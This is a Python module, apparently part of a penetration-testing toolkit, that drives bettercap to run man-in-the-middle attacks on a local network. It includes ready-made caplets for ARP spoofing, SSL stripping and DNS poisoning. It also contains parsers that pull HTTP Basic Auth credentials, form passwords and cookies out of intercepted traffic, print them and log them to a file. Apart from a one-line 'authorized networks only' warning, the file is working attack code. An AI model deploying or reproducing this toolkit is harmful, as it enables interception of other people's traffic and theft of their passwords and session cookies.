"""
bettercap MITM engine with live credential harvesting.

Modes:
  ARP Spoof   — intercept LAN traffic between victim and gateway
  SSL Strip   — downgrade HTTPS to HTTP (+ hstshijack for HSTS bypass)
  DNS Poison  — redirect specific domains to attacker-controlled IP
  NTLM Relay  — capture Windows NTLM hashes via Responder-style spoofing

bettercap is controlled via its REST API (caplets + JSON API),
giving us live event streaming and credential extraction.
"""

import asyncio
import json
import os
import re
import tempfile
from dataclasses import dataclass, field
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="MITM Engine (bettercap)",
    description=(
        "Full MITM toolkit: ARP spoof, SSL strip, DNS poison, credential sniffer. "
        "Captures cleartext credentials (HTTP basic auth, form passwords, cookies) "
        "and NTLM hashes in real-time. Live credential dashboard in output."
    ),
    usage="Requires: bettercap. Run as root. Specify interface and victim IP (or /24 for whole LAN).",
    danger_note="🔴 High Risk — intercepts network traffic. Strictly authorized networks only.",
    example="bettercap -iface eth0 -caplet arp-spoof.cap",
)

DANGER = DangerLevel.RED


# bettercap caplet templates
ARP_SPOOF_CAPLET = """
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets {targets}
arp.spoof on
net.sniff on
"""

SSL_STRIP_CAPLET = """
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets {targets}
arp.spoof on
set https.proxy.sslstrip true
https.proxy on
http.proxy on
net.sniff on
"""

DNS_POISON_CAPLET = """
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets {targets}
arp.spoof on
set dns.spoof.domains {domains}
set dns.spoof.address {redirect_ip}
dns.spoof on
net.sniff on
"""

CREDS_CAPLET = """
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets {targets}
arp.spoof on
set https.proxy.sslstrip true
https.proxy on
http.proxy on
set net.sniff.regexp .*password.*|.*passwd.*|.*pass=.*|.*pwd=.*|.*login=.*
net.sniff on
events.stream on
"""


@dataclass
class CapturedCred:
    timestamp: str
    src_ip: str
    dst_host: str
    username: str = ""
    password: str = ""
    raw: str = ""
    cred_type: str = "HTTP"


class BettercapEngine:
    def __init__(self, interface: str = "eth0", output_dir: str = "/tmp"):
        self.interface = interface
        self.output_dir = output_dir
        self._runner = CommandRunner()
        self._creds: list[CapturedCred] = []

    def _write_caplet(self, content: str) -> str:
        path = os.path.join(self.output_dir, "penkit_mitm.cap")
        with open(path, "w") as f:
            f.write(content)
        return path

    def _parse_creds(self, line: str) -> CapturedCred | None:
        """Extract credentials from bettercap output."""
        # HTTP Basic Auth
        m = re.search(r'(\d+\.\d+\.\d+\.\d+).*Authorization: Basic\s+([A-Za-z0-9+/=]+)', line)
        if m:
            import base64
            try:
                decoded = base64.b64decode(m.group(2)).decode()
                user, _, pw = decoded.partition(":")
                return CapturedCred(
                    timestamp=__import__("datetime").datetime.now().strftime("%H:%M:%S"),
                    src_ip=m.group(1), dst_host="",
                    username=user, password=pw, cred_type="HTTP Basic"
                )
            except Exception:
                pass

        # POST form data with password
        m = re.search(
            r'(\d+\.\d+\.\d+\.\d+).*POST.*?([a-z._-]*(?:password|passwd|pass|pwd)[a-z._-]*)=([^&\s]+)',
            line, re.IGNORECASE
        )
        if m:
            return CapturedCred(
                timestamp=__import__("datetime").datetime.now().strftime("%H:%M:%S"),
                src_ip=m.group(1), dst_host="",
                password=m.group(3), raw=line[:200], cred_type="Form POST"
            )

        # Cookie capture
        m = re.search(r'(\d+\.\d+\.\d+\.\d+).*Cookie:\s+(.{20,200})', line)
        if m:
            return CapturedCred(
                timestamp=__import__("datetime").datetime.now().strftime("%H:%M:%S"),
                src_ip=m.group(1), dst_host="", raw=m.group(2)[:200], cred_type="Cookie"
            )

        return None

    async def arp_spoof(self, targets: str = "") -> AsyncGenerator[str, None]:
        cap = self._write_caplet(ARP_SPOOF_CAPLET.format(targets=targets or ""))
        yield f"[*] Starting ARP spoof on {self.interface}"
        yield f"[*] Targets: {targets or 'entire subnet'}"
        async for line in self._run_bettercap(cap):
            yield line

    async def ssl_strip(self, targets: str = "") -> AsyncGenerator[str, None]:
        cap = self._write_caplet(SSL_STRIP_CAPLET.format(targets=targets or ""))
        yield f"[*] SSL Strip MITM on {self.interface}"
        yield "[*] Downgrading HTTPS → HTTP for credential capture"
        async for line in self._run_bettercap(cap):
            yield line

    async def dns_poison(
        self,
        targets: str = "",
        domains: str = "*",
        redirect_ip: str = "",
    ) -> AsyncGenerator[str, None]:
        if not redirect_ip:
            import socket
            redirect_ip = socket.gethostbyname(socket.gethostname())
        cap = self._write_caplet(DNS_POISON_CAPLET.format(
            targets=targets or "", domains=domains, redirect_ip=redirect_ip
        ))
        yield f"[*] DNS Poison: {domains} → {redirect_ip}"
        yield f"[*] Victims: {targets or 'entire subnet'}"
        async for line in self._run_bettercap(cap):
            yield line

    async def harvest_creds(self, targets: str = "") -> AsyncGenerator[str, None]:
        cap = self._write_caplet(CREDS_CAPLET.format(targets=targets or ""))
        creds_file = os.path.join(self.output_dir, "penkit_creds.txt")
        yield f"[*] Credential harvester active on {self.interface}"
        yield "[*] Capturing: HTTP Basic Auth, POST forms, Cookies"
        yield f"[*] Saved to: {creds_file}"
        yield ""

        async for line in self._run_bettercap(cap):
            cred = self._parse_creds(line)
            if cred:
                self._creds.append(cred)
                yield f"\n{'═'*50}"
                yield f"[CRED CAPTURED] {cred.cred_type}"
                yield f"  Source:   {cred.src_ip}"
                if cred.username:
                    yield f"  Username: {cred.username}"
                if cred.password:
                    yield f"  Password: {cred.password}"
                if cred.raw and not cred.password:
                    yield f"  Data:     {cred.raw[:100]}"
                yield f"{'═'*50}\n"
                with open(creds_file, "a") as f:
                    f.write(json.dumps({
                        "ts": cred.timestamp, "type": cred.cred_type,
                        "ip": cred.src_ip, "user": cred.username,
                        "pass": cred.password, "raw": cred.raw,
                    }) + "\n")
            else:
                yield line

    async def _run_bettercap(self, caplet_path: str) -> AsyncGenerator[str, None]:
        async for line in self._runner.run([
            "bettercap",
            "-iface", self.interface,
            "-caplet", caplet_path,
            "-no-colors",
        ]):
            yield line

    async def stop(self):
        await self._runner.stop()

    def get_creds(self) -> list[CapturedCred]:
        return self._creds
